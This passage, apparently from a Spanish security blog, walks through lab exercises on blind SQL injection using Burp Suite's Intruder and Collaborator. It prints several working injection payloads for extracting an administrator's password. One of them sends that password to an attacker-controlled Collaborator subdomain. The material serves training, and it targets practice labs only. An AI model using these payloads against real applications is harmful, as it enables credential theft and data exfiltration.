+<p>De esta forma, empezamos a probar caracteres con la query vista antes; minúsculas, mayúsculas y números hasta que vuelva a aparacer el mensaje:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220313181512.png" text-align="center" />
+</div>
+
+<p>Pero esto se puede implementar de una manera más rápida mediante la herramienta BurpSuite a través de un ataque de fuerza bruta.</p>
+
+<p>En primer lugar, debemos saber cuántos caracteres tiene la contraseña del administrador. Esto lo podemos saber mediante la función Length mediante la siguiente query:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220313231019.png" text-align="center" />
+</div>
+
+<p>En ella, primero hacemos una búsqueda que incluye la contraseña del administrador y además incluimos a modo de conjunción el tamaño de la misma. Si el tamaño es acertado, la query se procesa de manera correcta y nos saldrá el famoso mensaje por pantalla, con lo que probando finalemente obtenemos que la contraseña tiene 20 caracteres.</p>
+
+<p>Ahora abrimos burpsuite y configuramos el proxy tanto en el buscador y en la aplicación e interceptamos una request:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220313231524.png" text-align="center" />
+</div>
+
+<p>Seguidamente, envíamos la request al Intruder con el botón derecho y ahí ajustamos los parámetros (en este caso; las cookies) para intentar capturar el primer caracter de la contraseña:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220314210838.png" text-align="center" />
+</div>
+
+<p>Lo que hacemos es modificar la query SQL para que con la función SUBSTRING obtenga un caracter de la cadena password de administrator (que no conocemos) y la comparamos con otro caracter creando una respuesta condicional por parte de la aplicación, en el momento en el que el caracter de la contrasela coincida con el que nosotros pongámos aparecera el mensaje Welcome Back! y podremos detectarlo.</p>
+
+<p>Seguidamente, ajustamos el tipo de ataque ‘Sniper’ y ajustamos la lista de payloads metiendo números, minúsculas y mayúsculas:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220314211049.png" text-align="center" />
+</div>
+
+<p>y en opciones le damos a seguir redirección:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220313233240.png" text-align="center" />
+</div>
+
+<p>Y le damos a ‘Start Attack’.</p>
+
+<p>De esta forma, lo que Burp automatiza es una serie de request en batería en los que va modificando una parte de la información que envía a partir de la lista de payloads que nosotros asociamos. Cuando el ataque termina obtenemos una tabla con información tanto de las request como de las respuestas del servidor</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220314211416.png" text-align="center" />
+</div>
+
+<p>En concreto, a la derecha del todo podemos ver el tamaño de la respuesta del servidor, evidentemente nos interesan aquellas respuestas que tengan un tamaño alterado, pues son aquellas susceptibles de tener el mensaje Welcome back! que nos indican un “match” en los caracteres.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220314211546.png" text-align="center" />
+</div>
+
+<p>Así, hemos obtenido el primer caracter de la contraseña y vamos a emplearlo para obtener el resto de caracteres modificando el prototipo de request del intruder de la siguiente manera:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220314211758.png" text-align="center" />
+</div>
+
+<p>Modificamos los parámetros de la función SUBSTRING para que coga el primer y segundo caracter de la contraseña y añadimos el primer caracter de la misma, (la b) en la comparación final y definimos un conjunto de payloads (§§) para el segundo caracter. De forma que esta vez y al contrario de lo que ocurría la vez anterior no se están comparando dos caracteres, se comparan un par de caracteres. Si lo hiciéramos sólo cogiendo el segundo caracter habría un riesgo alto de que no nos diera un resultado correcto.</p>
+
+<p>De esta forma obtenemos el siguiente caracter, el 1:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220314212055.png" text-align="center" />
+</div>
+
+<p>Y volvemos a operar con la misma lógica, modificamos los parámetros de la función SUBSTRING para que recoga tres caracteres de la contraseña ‘password’ y añadimos en la comparación final tanto la b como el 1 y definimos un conjunto de payloads para el tercer caracter tal y como se puede ver en la siguiente imágen:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220314212143.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220314212351.png" text-align="center" />
+</div>
+
+<p>Y el tercer caracter es la letra ‘p’.</p>
+
+<p>La penúltima request de burp tendría la siguiente forma:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220314213519.png" text-align="center" />
+</div>
+
+<p>Después de iterar las 17 veces restantes este proceso terminamos por obtener la contraseña: b1pi1gavlqms8o0so7t2.</p>
+
+<p>Para comprobarlo, podemos utilizar el repeater para enviar la siguiente request y verificar la contraseña del administrador a través de la respuesta del servidor:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220314213955.png" text-align="center" />
+</div>
+
+<p>El match del servidor nos confirma que la comparación es correcta y por tanto es efectivamente la contraseña del administrador con lo que sólo queda logearse:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220314214226.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<h5 id="33-obteniendo-respuestas-condicionales-desencadenando-errores-sql">3.3. Obteniendo respuestas condicionales desencadenando errores SQL.</h5>
+
+<p>Supongámos ahora un caso diferente. Supongámos ahora que la aplicación realiza la misma búsqueda pero no altera su comportamiento en función de la query realizada. Entonces, inducir diferentes sentencias booleanas ya no sirve puesto que la aplicación no va a dar indicio alguno.</p>
+
+<p>En estos casos es posible, a menudo, obtener una respuesta condicional a través del desencadenamiento de un error SQL. Se trata de un error de sintáxis no manejado por la aplicación y que se vuelve visible para nosotros permitiendonos así valorar el código inyectado.</p>
+
+<p>La diferencia con el método anterior consiste en que con el anterior lo que hacíamos era provocar respuestas condicionales a partir de sentencias booleanas mientras que aquí lo que hacemos es provocar errores que se reflejan en la respuesta http del servidor.</p>
+
+<p>Veamos un ejemplo. Supongaḿos de nuevo la aplicación mencionada al principio de este apartado y supongámos que inyectamos los siguientes comandos:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '</span><span class="n">a</span><span class="s1">' END)='</span><span class="n">a</span>
+
+<span class="s1">' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '</span><span class="n">a</span><span class="s1">' END)='</span><span class="n">a</span>
+</code></pre></div></div>
+
+<p>Examinemos ambas sentencias. En ambos casos utilizamos el término ‘CASE’ para llevar a cabo una evaluación de una condición en función de la cual se selecciona o bien un caracter o bien una operación matemática que se compara con otro caracter, y aquí es donde las opciones se bifurcan:</p>
+
+<ul>
+  <li>
+    <p>En el primer caso, evaluamos la condición ‘1=2’ que es evidentemente falsa de forma que se desencadena la opción ‘ELSE’ y se toma el caracter ‘a’ que se compara con ‘a’ no habiendo ningún error y sin que la página desencadene comportamiento anómalo alguno.</p>
+  </li>
+  <li>
+    <p>En el segundo se evalúa la condición ‘1=1’ que es cierta y por tanto se toma la opción ‘THEN’ que selecciona el resultado de la operación matemática ‘1/0’ que no tiene solución.</p>
+  </li>
+</ul>
+
+<p>En el caso de que este tipo de error no esté contemplado en la aplicación, se devolverá un error que no servirá de indicio para saber que la opción propuesta no es correcta.</p>
+
+<p>De esta forma, <strong>podemos extrapolar el mecanismo anterior para evaluar una condición cuyo valor booleano queramos saber (por ejemplo, el valor de la comparación del caracter de una contraseña con otro caracter arbitrario como en el laboratorio anterior), si es cierto entonces mediante el uso de CASE se desencadena una operación sintácticamente errónea (en este caso la operación 1/0) que se traduce en una manifestación de la web que interpretaremos como una validación de dicha comparación</strong> y en consecuencia obtendremos un caracter de la contraseña.</p>
+
+<p>De lo contrario no tendremos nada y sabremos que la query evaluada no es verdadera:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' AND (SELECT CASE WHEN (Username = '</span><span class="n">Administrator</span><span class="s1">' AND SUBSTRING(Password, 1, 1) &gt; '</span><span class="n">m</span><span class="s1">') THEN 1/0 ELSE '</span><span class="n">a</span><span class="s1">' END FROM Users)='</span><span class="n">a</span>
+</code></pre></div></div>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 12: Blind SQL injection with conditional errors</strong>.</p>
+
+<p><strong>Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. La aplicación utiliza una cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie enviada.</strong></p>
+
+<p><strong>Los resultados de la consulta SQL no se devuelven y la aplicación no responde de forma diferente en función de si la consulta devuelve filas. Si la consulta SQL genera un error, la aplicación devuelve un mensaje de error personalizado.</strong></p>
+
+<p><strong>La base de datos contiene una tabla diferente llamada ‘users’, con columnas llamadas ‘username’ y ‘password’. Se resuelve logeándote como administrador.</strong></p>
+
+<p>Para comenzar, vamos a comprobar que la página web es susceptible de devolver un estado de error ante una query sql sintácticamente mal planteada. Para ello modificamos el campo de la cookie cuyo valor se va a utilizar para hacer una query SQL y se le introduce un caracter para estropear sintácticamente dicha búsqueda, por ejemplo le añadimos una comilla al final del valor de la cookie para que la query no se cierre adecuadamente obteniendo:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220316193722.png" text-align="center" />
+</div>
+
+<p>De esta forma, ya sabemos que la página se manifiesta ante errores de sintáxis y podemos aprovechar esto para desencadenar un error sintáctico cada vez que queramos validar un dato de la base de datos.</p>
+
+<p>Introducimos la siguiente query de forma adyacente en el campo de la cookie TrackingID.</p>
+
+<p>Podríamos aprovechar para concatenar una query con AND tal y como hemos hecho en otros laboratorios:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'AND (SELECT CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '</span><span class="n">a</span><span class="s1">' END FROM dual) = '</span><span class="n">a</span>
+</code></pre></div></div>
+
+<p>Observemos que se trata de una base de datos de Oracle, de ahí la necesidad del FROM dual.</p>
+
+<p>Lo que hace esta búsqueda es realizar una comparación de caracteres en función de una condición. Si esta es cierta compara el caracter de vuelto por la función TO_CHAR() sobre el parámetro 1/0 con ‘a’ y si es falsa, ‘a’ con ‘a’.</p>
+
+<p>Pero por el bien de la heterogeneidad vamos a poner otro ejemplo, vamos a concatenar al string del valor de TrackingID un caracter que seleccionaremos mediante una query:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' || '</span> <span class="p">(</span><span class="k">SELECT</span> <span class="k">CASE</span> <span class="k">WHEN</span> <span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span> <span class="k">THEN</span> <span class="p">(</span><span class="k">SELECT</span> <span class="s1">''</span> <span class="k">FROM</span> <span class="n">non_exist_table</span><span class="p">)</span> <span class="k">ELSE</span> <span class="s1">''</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Es decir, concatenamos al string anterior un caracter que elegimos mediante la validez de una condición mediante un CASE (esta condición será la query con la que obtendremos información de la base de datos). Si esta es cierta le sigue una sentencia sintácticamente mal escrita (en este caso nos aprovechamos de que se trata de una base de datos de Oracle que necesita de un FROM y una base de datos existente para ser sintácticamente válida) que genera un error que se tornará visible para nosotros y si no, nada, no provocando ningún error:</p>
+
+<p>1=0 -&gt; ELSE ‘’; No hay error.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220317162941.png" text-align="center" />
+</div>
+
+<p>1=1 -&gt; THEN (SELECT ‘a’ FROM non_exist_table); query sintácticamente mal escrita, error:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220317163115.png" text-align="center" />
+</div>
+
+<p>Y por tanto, se nos devuelve un error, fruto de una mala sintaxis en la query realizada.</p>
+
+<p>De esta forma, podemos modificar la condición para establacer comparaciones con datos en base a los cuales extraeremos información. Por ejemplo, vamos a comprobar la longitud de la contraseña del adiministrador:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220317190127.png" text-align="center" />
+</div>
+
+<table>
+  <tbody>
+    <tr>
+      <td>En la captura anterior debemos observar que hemos cambiado la sintaxis para introducir la query quitando la segunda comilla de después del primer concatenador</td>
+      <td> </td>
+      <td>y hemos añadido un segundo concatenador y una comilla, eso es debido a que, <strong>cuando añadimos un string mediante un SELECT, las comillas alrrededor del string se incorporan por defecto,</strong> (notemos que en el ejemplo anterior, aunque hemos utilizado un SELECT no cogíamos ningún valor, ya que o bien desencadenábamos un error o no cogíamos nada) de manera que hay que hacer un reajuste:</td>
+    </tr>
+  </tbody>
+</table>
+
+<ul>
+  <li>Cerramos la primera comilla con el valor de TrankingID y añadimos un concatenador de strings.</li>
+  <li>Añadimos con SELECT el caracter/string que incorpora sus propias comillas.</li>
+  <li>Añadimos un segundo concatenador y cerramos la comilla para evitar un error sintáctico con la búsqueda que realiza el propio servidor, todo queda:</li>
+</ul>
+
+<p>Como nos devuelve un error, la contraseña tiene más de un caracter. Haciendo pruebas, llegamos a que la contraseña no tiene más de 20 caracteres, pero tampoco tiene menos de 20, por tanto tiene 20 caracteres.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220317190340.png" text-align="center" />
+</div>
+
+<p>Una vez sabemos la longitud de la contraseña, procedemos a sacar la misma caracter a caracter como hemos hecho en el laboratorio anterior con BurpSuite:</p>
+
+<ul>
+  <li>Intecerptamos una petición y la mandamos al Intruder.</li>
+  <li>En ella definimos una posición para el conjunto de payloads del caracter a examinar respecto de la primera letra de la contraseña</li>
+</ul>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220317192828.png" text-align="center" />
+</div>
+
+<p>Observemos que en lugar de SUBSTRING empleamos SUBSTR debido a que estamos en una base de datos de Oracle (ver primera parte del CheatSheet).</p>
+
+<ul>
+  <li>Definimos el conjunto de payloads y le damos en ‘opciones’ a seguir redirección:</li>
+</ul>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220317192415.png" text-align="center" />
+</div>
+
+<p>Y empezamos el ataque, obteniendo el siguiente resultado:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220317193102.png" text-align="center" />
+</div>
+
+<p>De manera que modificamos la request añadiendo la letra obtenida y modificando los parámetros de la función SUBSTR para obtener la siguiente letra de la contraseña:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220317193614.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220317193735.png" text-align="center" />
+</div>
+
+<p>Y la siguiente letra es una ‘s’. Volvemos a modificar la request y a lanzar el ataque:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220317193826.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220317193952.png" text-align="center" />
+</div>
+
+<p>Finalmente la última request del intruder para un ataque de fuerza bruta tiene la forma:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220317195344.png" text-align="center" />
+</div>
+
+<p>Y la contraseña es: 7scd8wkcvw2kvcizy28r</p>
+
+<p>Para verificarlo utilizamos el repeater y como nos devuelve un error, la comparación es correcta y por tanto se trata de la contraseña:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220317195530.png" text-align="center" />
+</div>
+
+<p>Terminamos logeándonos en el servidor como adminstrador.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220317195709.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<h5 id="34-explotando-una-vulnerabilidad-sql-injection-provocando-retrasos-en-las-respuestas-http">3.4. Explotando una vulnerabilidad SQL injection provocando retrasos en las respuestas HTTP.</h5>
+
+<p>Supongámos que ahora estamos ante una aplicación que no muestra ninguna manifestación visual ante una query SQL mal introducida.</p>
+
+<p>En ese caso, ninguno de los métodos anteriores nos sirven y sólo queda provocar un retraso en la respuesta para comprobar que nuestra query se ha introducido satisfactoriamente. Por ejemplo, consideremos la siguiente búsqueda:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">;</span> <span class="n">IF</span> <span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span> <span class="n">WAITFOR</span> <span class="n">DELAY</span> <span class="s1">'0:0:10'</span><span class="c1">--</span>
+<span class="p">;</span> <span class="n">IF</span> <span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span> <span class="n">WAITFOR</span> <span class="n">DELAY</span> <span class="s1">'0:0:10'</span><span class="c1">--`</span>
+</code></pre></div></div>
+
+<p>En el primer caso, no sucedera nada debido a que la condición que impone el IF no es cierta, pero en el segundo esta si lo es y por tanto se desata un ‘delay’ que mantiene la página en espera 10 segundos.</p>
+
+<p>Este mecanismo es extrapolable de la misma manera a como hemos visto en apartados anteriores, sustityendo la condición por una comparación de la que se extrae información de la base de datos. Si esta es cierta, se verifica a través del delay, de lo contrario no ocurre nada.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 13: Blind SQL Injection with time delays</strong>.</p>
+
+<p><strong>Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. La aplicación utiliza una cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie enviada.</strong></p>
+
+<p><strong>Los resultados de la consulta SQL no se devuelven y la aplicación no responde de forma diferente en función de si la consulta devuelve filas o provoca un error. Sin embargo, dado que la consulta se ejecuta de forma síncrona, es posible activar retrasos de tiempo condicionales para inferir información.</strong></p>
+
+<p><strong>Para resolver el laboratorio, aproveche la vulnerabilidad de inyección SQL para causar un retraso de 10 segundos.</strong></p>
+
+<p>Acudimos a la sección de cookies en inspeccionar elemento con TrackingID y a raiz de ahí modificamos el valor de la cookie para introducir una función que provoque el delay correspondiente.</p>
+
+<p>El concatenador y la función utilizada puede variar, en este caso estamos en una base de datos PostgreSQL y como tal:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220318033753.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 14: Blind SQL injection with time delays and information retrieval</strong>.</p>
+
+<p><strong>Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. La aplicación utiliza una cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie enviada.</strong></p>
+
+<p><strong>Los resultados de la consulta SQL no se devuelven y la aplicación no responde de forma diferente en función de si la consulta devuelve filas o provoca un error. Sin embargo, dado que la consulta se ejecuta de forma síncrona, es posible activar retrasos de tiempo condicionales para inferir información.</strong></p>
+
+<p><strong>La base de datos contiene una tabla diferente llamada usuarios, con columnas llamadas nombre de usuario y contraseña. Debe explotar la vulnerabilidad de inyección ciega de SQL para averiguar la contraseña del usuario administrador.</strong></p>
+
+<p><strong>Para resolver la práctica de laboratorio, inicie sesión como usuario administrador.</strong></p>
+
+<p>En primer lugar, introducimos la siguiente query dentro del valor de la cookie TrackingID y comprobamos que tiene efecto viendo como la respuesta del servidor tiene un delay de 10 segundos:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220318040821.png" text-align="center" />
+</div>
+
+<p>Seguidamente procedemos a la explotación de esta vulnerabilidad cambiando el ‘1=1’ a la query de busqueda, en este caso; para comprobar el tamaño de la contraseña.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220318040544.png" text-align="center" />
+</div>
+
+<p>Si existe en primer lugar un usuario con el nombre ‘administrator’ y en segundo lugar, el tamaño de la contraseña de ese usuario.</p>
+
+<p>Y como a partir de la siguiente query deja de haber delay, entonces la contraseña tiene 20 caracteres:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220318042402.png" text-align="center" />
+</div>
+
+<p>A partir de aquí preparamos un ataque de fuerza bruta con el Intruder de Burpsuite tal y como hemos hecho en otros laboratorios:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220318042910.png" text-align="center" />
+</div>
+
+<p>Definimos el conjunto de payloads y lanzamos el ataque. Esta vez, no vamos a obtener ningún dato que nos indique que se trata del caracter acertado. El único indicio que tenemos es el retraso que se produce que se traduce en un parón en la lista de resultados de BurpSuite:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220318044131.png" text-align="center" />
+</div>
+
+<p>Así, obtenemos que la primera letra es un ‘2’, ya que el resultado se muestra en el momento en el que se tiene la respuesta del servidor, por tanto si la respuesta del número que va después del 1, (el 2) tarda 10 segundos, es porque ese es dicho caracter.</p>
+
+<p>Modificamos la request y continuamos:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220318044207.png" text-align="center" />
+</div>
+
+<p>Y de nuevo hay un parón en la q:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220318044247.png" text-align="center" />
+</div>
+
+<p>De forma que la segunda letra es la ‘w’.</p>
+
+<p>La última query tiene la forma:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220318045921.png" text-align="center" />
+</div>
+
+<p>Y la contraseña es: 2wfoppoqr30vys1su1pk</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220318050210.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<h5 id="35-explotando-una-vulnerabilidad-ciega-usando-técnicas-oast">3.5. Explotando una vulnerabilidad ciega usando técnicas OAST.</h5>
+
+<h6 id="351-qué-es-un-testeo-de-seguridad-oast">3.5.1. ¿Qué es un testeo de seguridad OAST?</h6>
+
+<p>Un testeo de seguridad OAST es un método de testeo de una aplicación aplicación que utiliza servidores externos para detectar vulnerabilidades sobre una aplicación.</p>
+
+<p>Se desarrolló para mejorar el modelo DAST (dynamic application security testing). BurpSuite tiene capacidades OAST.</p>
+
+<p><br /></p>
+
+<h6 id="352-capacidades-exclusivas-del-método-oast">3.5.2. Capacidades exclusivas del método OAST.</h6>
+
+<p>Una aplicación web puede contener cualquier cantidad de vulnerabilidades de seguridad. Muchos de estos errores son ampliamente conocidos, pero las vulnerabilidades se descubren regularmente en software tanto antiguo como nuevo. A esto se suma el hecho de que las aplicaciones web, y los idiomas en los que están codificadas, tienden a estar en continuo desarrollo. Nada permanece igual por mucho tiempo.</p>
+
+<p>La naturaleza dinámica de esta situación complica las cosas. Significa que ninguna cantidad de pruebas, y ninguna combinación de técnicas, es probable que encuentre todas las vulnerabilidades potenciales en una aplicación. Incluso si lo hiciera, la situación no duraría mucho. Los profesionales de la seguridad compiten constantemente con los ciberdelincuentes, y las consecuencias de una falla pueden ser devastadoras.
+Vulnerabilidades invisibles - DAST</p>
+
+<p>El principal punto de venta de DAST siempre ha sido que puede producir resultados de muy alta calidad. Si está examinando un informe producido con este método, entonces puede estar casi seguro de que está viendo vulnerabilidades reales. Esta información puede enviarse directamente a su equipo de desarrollo para que la corrija.</p>
+
+<p>Pero cuando se usan de forma aislada, las pruebas dinámicas tienen dificultades para detectar algunos tipos de vulnerabilidades de seguridad. Los errores ciegos y asincrónicos se pasan por alto fácilmente, por ejemplo. Como verá a continuación, aumentar las pruebas dinámicas con OAST contribuye en gran medida a solucionar este problema.
+Falsos positivos - SAST</p>
+
+<p>SAST (pruebas de seguridad de aplicaciones estáticas) es otro método común de prueba de seguridad. Toma efectivamente el enfoque opuesto a las pruebas dinámicas. Donde DAST considera una aplicación como lo haría un atacante, desde afuera hacia adentro, SAST mira el código en sí. Este enfoque le da un conjunto diferente de ventajas e inconvenientes.</p>
+
+<p>El principal problema aquí es que debido a que SAST en realidad no ejecuta ningún código, solo puede ver lo que “podría” estar pasando. Esto significa que, en general, SAST producirá un conjunto de resultados más grande y ruidoso que DAST. Este ruido viene en forma de falsos positivos. Entre estas habrá vulnerabilidades reales, pero determinar cuáles son cuesta tiempo y dinero.</p>
+
+<p>¿Quiere obtener más información sobre las pruebas de seguridad de aplicaciones web?
+¿Cómo funciona OAST?</p>
+
+<p>OAST mejora los resultados devueltos por las pruebas de seguridad DAST. En muchos sentidos, es en sí mismo un método dinámico, aunque puede ver “a la vuelta de las esquinas”. Esto se debe a que las “pruebas de seguridad de aplicaciones dinámicas” en realidad solo denotan una prueba que no puede ver el funcionamiento interno de una aplicación. Esto también podría describir OAST.
+Atacando desde afuera</p>
+
+<p>Las pruebas dinámicas convencionales son elegantes en su simplicidad. En esencia, envía cargas útiles a una aplicación de destino y analiza las respuestas que regresan, tal como lo haría un atacante real:</p>
+
+<p><br /></p>
+
+<h6 id="352-capacidades-exclusivas-del-método-oast-1">3.5.2. Capacidades exclusivas del método OAST.</h6>
+
+<p>Ahora supongámos que la aplicación continúa haciendo la misma búsqueda utilizando la cookie mencionada pero de forma asíncrona.</p>
+
+<p>Esta utiliza un hilo para para procesar la petición del usario y luego emplea un hilo secundario para procesar la query SQL, por tanto, esta sigue siendo vulnerable por falta de mecanismos de seguridad pero todo lo que ocurre en ese segundo hilo no afecta en nada a lo que el usuario percibe desde el navegador.</p>
+
+<p>En esta situación todavía es posible explotar esta vulnerabilidad ciega desencadenando <strong>interacciones de red fuera de banda</strong> sobre un sistema sobre el que tienes control. El protocolo óptimo sobre el que prácticar esta técnica es el DNS.</p>
+
+<p>La forma de implementar esta técnica es utiliza Burp Colaborator** con el cliente de BurpColaborator disponible desde la versión Pro de BurpSuite.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 15: Blind SQL Injection with out of band interaction</strong></p>
+
+<p>Este laboratorio contiene SQLi ciega. La aplicación utiliza una cookie de seguimiento para análisis y se realiza una consulta SQL que contiene el valor de la cookie.</p>
+
+<p>Sin embargo, la consulta se ejecuta de forma asíncrona y no tiene ningún efecto sobre la respuesta de la aplicación.</p>
+
+<p>Esto lo podemos comprobar introduciéndonos en el laboratorio e intentando modificar dicha cookie haciéndo búsquedas y viéndo que ninguna técnica tiene efecto.</p>
+
+<p>Acto seguido, vamos a burpsuite e iniciamos el servicio de Burp Collaborator:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220505213839.png" text-align="center" />
+</div>
+
+<p>Le damos a Copy to clipboard</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220505214041.png" text-align="center" />
+</div>
+
+<p>para obtener un dominio completo del cliente de BurpCollaborator y lo utilizamos en el siguiente payload para hacer que el servidor haga una búsqueda DNS sobre nuestro BurpCollaborator:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220505214109.png" text-align="center" />
+</div>
+
+<p>Y con ello habríamos terminado el laboratorio.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 16: Blind SQL injection with out-of-band data exfiltration</strong>.</p>
+
+<p>De nuevo este laboratorio contiene una vulnerabilidad SQLi ciega. La aplicación utiliza una cookie de seguimiento con la que realiza una búsqueda SQL.</p>
+
+<p>El laboratorio contiene una tabla diferente llamada <em>users</em> con columnas denominada <em>username</em> y <em>password</em>. Hay que explotar la vulnerabilidad SQLi para obtener la contraseña del usuario administrador.</p>
+
+<p>Accediendo al laboratorio y haciendo búsquedas con dicha cookie observamos que no hay ningún cambio ni recibimos información alguna.</p>
+
+<p>Así, acudimos a Burp y activamos el cliente de BurpCollaborator como en el laboratorio anterior. Seguidamente, interceptamos una request e introducimos un payload como el siguiente:</p>
+
+<pre><code class="language-default">'+UNION+SELECT+EXTRACTVALUE(xmltype('&lt;%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"&gt;+%25remote%3b]&gt;'),'/l')+FROM+dual--
+</code></pre>
+
+<p>(Haciendo el correspondiente cambio de BURP-COLLABORATOR-SUBDOMAIN). Podemos observar que esta lleva a cabo una búsqueda para que nos de la contraseña y los nombres de usuario de la tabla users.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220505215342.png" text-align="center" />
+</div>
+
+<p>Seguidamente, esperamos 60 segundos o en la interfaz de Burp Collaborator Client le damos a Poll now hasta que aparezca información de la búsquda</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220505215532.png" text-align="center" />
+</div>
+
+<p>Una vez aparece información podemos que existe una que es HTTP y concretamente, debajo podemos ver que aparece una descripción:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220505215605.png" text-align="center" />
+</div>
+
+<p>Y en la request del Collaborator obtenemos:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220515151625.png" text-align="center" />
+</div>
+
+<p>Y de ahí ya tenemos la contraseña del administrador.</p>
+
